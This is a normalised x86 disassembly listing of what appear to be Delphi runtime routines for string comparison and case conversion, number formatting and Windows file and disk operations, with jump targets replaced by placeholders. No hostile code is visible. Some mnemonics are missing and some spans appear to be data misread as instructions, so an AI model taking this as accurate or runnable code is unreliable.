mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407c0c
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407c60
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407c0c
test eax eax
jne r-xdata
sub_407c84
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041b8
mov ebx eax
mov eax esi
call sub_4043b8
mov edx eax
mov eax edi
mov ecx ebx
call sub_403fe8
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407cb8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4041b8
mov ebx eax
mov eax esi
call sub_4043b8
mov edx eax
mov eax edi
mov ecx ebx
call sub_403fe8
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407cec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041b8
push eax
mov eax esi
call sub_4043b8
push eax
mov eax ebx
call sub_4041b8
push eax
mov eax ebx
call sub_4043b8
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407d24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4041b8
push eax
mov eax esi
call sub_4043b8
push eax
mov eax ebx
call sub_4041b8
push eax
mov eax ebx
call sub_4043b8
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407d74
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407d94
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4041b8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403ef8
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404418
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407de4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4041b8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4041b8
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407e48
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407e5e
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407e5e
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e5e
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e94
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407e48
mov edx esi
pop eax
call sub_403fe8
add esp 0x10
pop esi
retn
sub_407eb4
or cl cl
jne sub_407ee8
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407ee8
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407ee8
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407ee8
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f80
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407eb4
mov edx esi
pop eax
call sub_403fe8
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407fa8
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407e48
mov edx esi
pop eax
call sub_403fe8
add esp 0x20
pop esi
retn
xor edx edx
sub_407fd0
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b60
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407a9c
sub_408024
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b60
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408044
mov eax [ rw-data ]
call sub_404cf0
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404cf0
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404eac
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f4c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404eac
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f4c
sub_4080d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407d5c
test al al
je r-xdata
sub_408110
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4094b4
mov edx eax
test dl dl
je r-xdata
call sub_408044
push ebp
mov eax [ rw-data ]
call sub_404cf8
mov edx eax
mov eax [ rw-data ]
call sub_4080d4
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404cf8
mov edx eax
mov eax [ rw-data ]
call sub_4080d4
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4081ac
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f4c
call sub_408044
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f4c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f4c
jmp r-xdata
pop esi
pop ebx
retn
sub_4081fc
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
test ch 0xff
push [ ebx ]
rcl [ ebp + 0x68 ] 0xba
add [ eax ] 0x64
push [ eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_403ef8
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4053f8
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4082c1
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404934
retn
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add al 0x0
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_403fe8
cmp [ ebx + 0x4 ] 0x0
sub_408254
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404864
xor eax eax
push ebp
push sub_4082ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_403ef8
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4053f8
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4082c1
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404934
retn
sub_4082dc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4043b8
push eax
call CreateFileA
sub_408334
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4043b8
push eax
call CreateFileA
pop ebx
retn
sub_408360
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_40838c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4083b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4083f8
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_4043b8
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_408470
push ebx
push esi
mov esi eax
mov eax esi
call sub_4041b8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c01c
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4084a0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4041b8
mov edi eax
mov eax ebx
call sub_4043b8
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4087d0
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c01c
cmp al 0x2
jne r-xdata
dec edi
sub_4084f0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4084a0
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404418
pop edi
pop esi
pop ebx
retn
sub_408528
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_4084a0
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403ef8
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404418
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408570
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4043b8
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403fe8
add esp 0x108
pop esi
pop ebx
retn
sub_4085ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404ccc
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404ccc
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_40865c
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408684
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_4086b0
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4086e4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4041b8
push eax
mov eax ebx
call sub_4043b8
mov edx eax
mov eax esi
pop ecx
call sub_4086b0
pop esi
pop ebx
retn
sub_408708
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4043b8
mov edx eax
mov ecx edi
mov eax ebx
call sub_4086b0
pop edi
pop esi
pop ebx
retn
sub_408728
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_40874c
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_40878c
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4087e4
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_40886c
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408620
mov esi eax
inc esi
mov eax esi
call sub_40884c
mov ecx esi
mov edx ebx
call sub_40864c
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4088a8
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c040
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_40864c
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407a9c
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_408930
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408c87
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408a12
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408a5a
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408a12
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_408924
pop edx
or edx edx
je r-xdata
sub_408a12
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408c87
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408a5a
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408c87
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_4088a8
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408a81 ]
mov ebx ecx
sub cl 0x44
je sub_407eb4
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404120
jmp r-xdata
mov esi sub_404180
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407eb4
sub cl 0x44
je sub_407e48
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407e48
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407eb4
mov ecx 0x10
cmp bl 0x58
je sub_407e48
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408900
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408e40
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407e48
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408ca8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408620
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_408930
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408ce8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408620
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_408930
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408d3c
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4041b8
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4041b8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_408930
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403fe8
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403ef8
mov eax esi
mov edx ebx
